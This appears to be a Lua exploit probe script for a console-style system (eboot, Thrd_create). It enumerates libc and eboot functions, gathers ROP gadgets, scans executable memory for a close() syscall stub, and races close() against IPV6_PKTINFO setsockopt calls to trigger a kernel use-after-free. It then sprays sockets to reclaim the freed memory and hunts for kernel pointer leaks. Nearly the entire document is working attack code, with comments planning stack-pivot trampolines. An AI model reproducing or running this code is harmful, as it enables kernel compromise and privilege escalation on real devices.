-- CRASH_CLASS: HIGH
-- PROBE 132a: IPV6 UAF with ROP trampoline for thread close
--
-- Problem: Thrd_create(fn, arg) calls fn(arg) with arg in rdi.
-- We need close(fd) = syscall(6, fd). The syscall;ret stub needs rax=6.
-- Solution: Build a ROP trampoline in writable memory:
--   pop rax; ret; <6>; syscall;ret_stub
-- Point thread entry at pop_rsp;ret gadget with arg=trampoline_addr
-- Actually simpler: thread calls fn(arg) where arg=fd goes to rdi.
-- If we find "mov eax, 6; syscall; ret" anywhere in eboot RX, use that.
-- Or: use native.fcall_with_rax from MAIN thread for close,
--     and have the THREAD do the setsockopt loop via a wrapper.
--
-- Strategy B (reversed roles):
--   Main thread: calls close(fd) via native.fcall_with_rax(stub, 6, fd)
--   Thread: entry = setsockopt wrapper or some function that accesses the socket
--   Race: thread is running setsockopt while main closes the fd
--
-- Strategy C (stack pivot trampoline):
--   Allocate writable buffer, write ROP chain: pop_rax;ret | 6 | syscall_stub
--   Thread entry = pop_rsp;ret, arg = buffer_addr
--   Thread pops rsp to our buffer, executes our chain = close(fd)
--   But fd must be in rdi... it's lost when we pivot stack.
--   Fix: write fd into the chain: pop_rdi;ret | fd | pop_rax;ret | 6 | syscall_stub

print("=== PROBE 132a: UAF TRAMPOLINE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
print("has_rax=" .. tostring(has_rax ~= nil))

-- ============================================================
-- PHASE 0: Enumerate ALL available functions
-- ============================================================
print("")
print("--- PHASE 0: FUNCTION ENUMERATION ---")

local close_fn = nil
print("[libc_addrofs]")
for k, v in pairs(libc_addrofs) do
    print("  " .. tostring(k) .. " = " .. tostring(v))
    local ks = tostring(k):lower()
    if ks:find("close") then close_fn = v end
end
print("[eboot_addrofs]")
for k, v in pairs(eboot_addrofs) do
    print("  " .. tostring(k) .. " = " .. tostring(v))
    local ks = tostring(k):lower()
    if ks:find("close") and not close_fn then close_fn = v end
end

if close_fn then
    print("CLOSE FUNCTION FOUND: " .. tostring(close_fn))
end

-- ============================================================
-- PHASE 1: Build close trampoline via stack pivot
-- ============================================================
print("")
print("--- PHASE 1: STACK PIVOT TRAMPOLINE ---")

local pop_rsp = gadgets["pop rsp; ret"]
local pop_rdi = gadgets["pop rdi; ret"]
local pop_rax = gadgets["pop rax; ret"]
local pop_rsi = gadgets["pop rsi; ret"]
local pop_rdx = gadgets["pop rdx; ret"]
local pop_rcx = gadgets["pop rcx; ret"]
local pop_r8 = gadgets["pop r8; ret"]
local ret_gadget = gadgets["ret"]

print("pop_rsp=" .. tostring(pop_rsp))
print("pop_rdi=" .. tostring(pop_rdi))
print("pop_rax=" .. tostring(pop_rax))
print("stub=" .. tostring(stub))

-- Trampoline: writable buffer containing ROP chain
-- When thread calls pop_rsp;ret with arg=trampoline_addr:
--   rdi = trampoline_addr (from Thrd_create arg)
--   But pop_rsp;ret will: pop rsp from stack, ret
--   Wait - the thread entry is CALLED, so the stack has return addr
--   fn(arg): rdi=arg, rsp points to [return_addr, ...]
--   pop_rsp;ret: pops top of stack into rsp, then rets from NEW rsp
--   So we need the STACK to contain our trampoline addr, not rdi
--
-- Actually Thrd_create calls fn(arg):
--   call fn  -> pushes return addr, jumps to fn
--   fn = pop_rsp;ret -> pops return_addr into rsp (useless - returns to caller)
--
-- This won't work as entry point. Let's think differently.
--
-- What if we use the thread's arg as a pointer to a struct that contains
-- both the fd and a function to call? But we only get fn(arg).
--
-- Alternative: scan eboot for "mov eax, 6; syscall" (close syscall)
-- B8 06 00 00 00 0F 05 = mov eax, 6; syscall
-- This would be a direct close() implementation we can call from thread

print("")
print("--- PHASE 2: SCAN EBOOT FOR CLOSE STUB ---")

-- Get eboot base
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local sc_info = make_sc(593)
pcall(function() sc_info(uint64(0), info) end)

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local text_sz_lo = safe_rd(info + 0x110)
local text_sz_hi = safe_rd(info + 0x114)

if text_lo and text_hi then
    local eboot_text = uint64(string.format("0x%X%08X", text_hi, text_lo))
    local eboot_size = text_sz_hi and uint64(string.format("0x%X%08X", text_sz_hi, text_sz_lo)) or uint64(0x1000000)
    print("eboot .text @ " .. tostring(eboot_text) .. " size=" .. tostring(eboot_size))

    -- Search for: B8 06 00 00 00 0F 05 (mov eax, 6; syscall)
    -- Scan in safe 4KB chunks, only in RX .text region
    local scan_size = to_num(eboot_size)
    if scan_size > 0x2000000 then scan_size = 0x2000000 end -- cap at 32MB

    local close_stub = nil
    local scan_count = 0
    local MAX_SCAN = 0x800000 -- 8MB max to avoid timeout

    print("Scanning " .. string.format("0x%X", math.min(scan_size, MAX_SCAN)) .. " bytes for close syscall stub...")

    for off = 0, math.min(scan_size, MAX_SCAN) - 8, 4 do
        local addr = eboot_text + off
        local d1 = safe_rd(addr)
        if d1 == nil then break end

        -- B8 06 00 00 = start of mov eax, 6
        if d1 == 0x00000006 then
            -- Check preceding byte for 0xB8
            local prev = safe_rd(addr - 1)
            if prev then
                local b = prev % 0x100000000
                local top_byte = math.floor(b / 0x1000000) % 256
                if (b % 256) == 0xB8 or top_byte == 0xB8 then
                    -- potential match, check next bytes for 0F 05
                    local d2 = safe_rd(addr + 3)
                    if d2 then
                        local lo2 = d2 % 65536
                        if lo2 == 0x050F then
                            close_stub = addr - 1
                            print("FOUND close stub at " .. tostring(close_stub))
                            break
                        end
                    end
                end
            end
        end

        -- Also check for B8 06 00 00 00 directly at dword boundary
        if d1 == 0x000006B8 then
            local d2 = safe_rd(addr + 4)
            if d2 then
                local lo_byte = d2 % 256
                local hi_byte = math.floor(d2 / 256) % 256
                if lo_byte == 0x00 and hi_byte == 0x0F then
                    -- Check next: should be 05
                    local d3 = safe_rd(addr + 5)
                    if d3 and (d3 % 256) == 0x05 then
                        close_stub = addr
                        print("FOUND close stub (aligned) at " .. tostring(close_stub))
                        break
                    end
                end
            end
        end

        scan_count = scan_count + 1
        if scan_count % 100000 == 0 then
            print("  scanned " .. scan_count .. " dwords...")
            if not pcall(function() return to_num(syscall.getpid()) end) then
                print("CANARY FAIL during scan")
                break
            end
        end
    end

    if not close_stub then
        print("No close stub found in first 8MB")
        -- Alternative: search for the known syscall;ret stub pattern
        -- The stub at syscall.pipe.fn_addr does: mov rax, [rsp-?]; syscall; ret
        -- Let's read what's actually at the stub
        if stub then
            print("")
            print("Reading syscall stub bytes at " .. tostring(stub) .. ":")
            for i = 0, 24, 4 do
                local v = safe_rd(stub + i)
                if v then
                    print(string.format("  +%d: 0x%08X", i, v))
                end
            end
        end
    end

    -- ============================================================
    -- PHASE 3: IPV6 RACE (using best available method)
    -- ============================================================
    print("")
    print("--- PHASE 3: IPV6 RACE ---")

    local AF_INET6 = 28
    local SOCK_DGRAM = 2
    local IPPROTO_UDP = 17
    local IPPROTO_IPV6 = 41
    local IPV6_PKTINFO = 46
    local sc_socket = make_sc(97)
    local sc_close = make_sc(6)
    local sc_setsockopt = make_sc(105)
    local sc_getsockopt = make_sc(118)
    local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
    local thrd_join_fn = fcall(libc_addrofs.Thrd_join)

    local thread_close_fn = close_stub or close_fn

    if thread_close_fn and has_rax then
        print("Mode A: Thread=close(" .. tostring(thread_close_fn) .. ") + Main=setsockopt via fcall_with_rax")
        local ROUNDS = 200
        local pktinfo = memory.alloc(0x20)
        local race_hits = 0

        for round = 1, ROUNDS do
            -- Create target IPv6 socket
            local target = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
            if target < 0 then print("round " .. round .. ": socket fail=" .. target); break end

            -- Set initial PKTINFO to allocate kernel pktopts
            memory.write_qword(pktinfo, 0)
            memory.write_qword(pktinfo + 8, 0)
            memory.write_dword(pktinfo + 16, 0)
            native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14)

            -- Launch thread to close(target)
            local thr = memory.alloc(8)
            memory.write_qword(thr, 0)
            pcall(thrd_create_fn, thr, thread_close_fn, uint64(target))

            -- RACE: immediately hammer setsockopt from main thread
            local sso1 = to_num(native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))
            local sso2 = to_num(native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))
            local sso3 = to_num(native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))

            -- Join thread
            sleep(0.01, 's')
            pcall(thrd_join_fn, memory.read_qword(thr), uint64(0))

            -- Check: if setsockopt succeeded AFTER close, we hit the race
            if sso1 == 0 or sso2 == 0 or sso3 == 0 then
                race_hits = race_hits + 1
                if race_hits <= 10 then
                    print(string.format("round %d: RACE HIT fd=%d sso=%d/%d/%d",
                        round, target, sso1, sso2, sso3))
                end

                -- Spray to reclaim freed pktopts
                local spray = {}
                for s = 1, 32 do
                    local sf = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
                    if sf >= 0 then
                        memory.write_qword(pktinfo, 0x4141414141414141)
                        memory.write_qword(pktinfo + 8, 0x4242424242424242)
                        native.fcall_with_rax(stub, 105, sf, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14)
                        spray[#spray+1] = sf
                    end
                end

                -- Check spray for confusion (kernel pointer leak)
                local getbuf = memory.alloc(0x40)
                local lenbuf = memory.alloc(4)
                for _, sf in ipairs(spray) do
                    memory.write_dword(lenbuf, 0x40)
                    local gso = to_num(native.fcall_with_rax(stub, 118, sf, IPPROTO_IPV6, IPV6_PKTINFO, to_num(getbuf), to_num(lenbuf)))
                    if gso == 0 then
                        local v0 = safe_rq(getbuf)
                        local v1 = safe_rq(getbuf + 8)
                        if v0 then
                            local h0, l0 = get_hi_lo(v0)
                            if h0 >= 0xFFFF8000 then
                                print(string.format("*** KERNEL POINTER LEAK fd=%d: 0x%X%08X ***", sf, h0, l0))
                            end
                        end
                    end
                end

                -- Cleanup spray
                for _, sf in ipairs(spray) do
                    native.fcall_with_rax(stub, 6, sf)
                end
            elseif round <= 5 or round % 50 == 0 then
                print(string.format("round %d: fd=%d sso=%d/%d/%d (miss)", round, target, sso1, sso2, sso3))
            end

            -- Health check every 25 rounds
            if round % 25 == 0 then
                local hok = pcall(function() return to_num(syscall.getpid()) end)
                if not hok then
                    print("*** CRASH at round " .. round .. " ***")
                    break
                end
                if round % 50 == 0 then
                    print("  progress: " .. round .. "/" .. ROUNDS .. " hits=" .. race_hits)
                end
            end
        end

        print("Total race hits: " .. race_hits .. " / " .. ROUNDS)

    elseif has_rax then
        print("Mode B: Main-only sequential race via fcall_with_rax (no close fn for threads)")
        -- Reversed: thread does something benign, main does close+setsockopt fast
        local ROUNDS = 200
        local pktinfo = memory.alloc(0x20)

        for round = 1, ROUNDS do
            local target = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
            if target < 0 then break end

            memory.write_qword(pktinfo, 0)
            memory.write_qword(pktinfo + 8, 0)
            memory.write_dword(pktinfo + 16, 0)
            native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14)

            -- Fast close + immediate setsockopt
            native.fcall_with_rax(stub, 6, target)
            local sso = to_num(native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))

            if sso ~= -1 or round <= 3 or round % 50 == 0 then
                print(string.format("round %d: fd=%d sso=%d%s", round, target, sso, sso == 0 and " HIT" or ""))
            end

            if round % 50 == 0 then
                if not pcall(function() return to_num(syscall.getpid()) end) then
                    print("CRASH"); break
                end
            end
        end
    else
        print("No fast call mechanism - skipping race")
    end
else
    print("Cannot get eboot .text info")
end

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 132a COMPLETE ===")
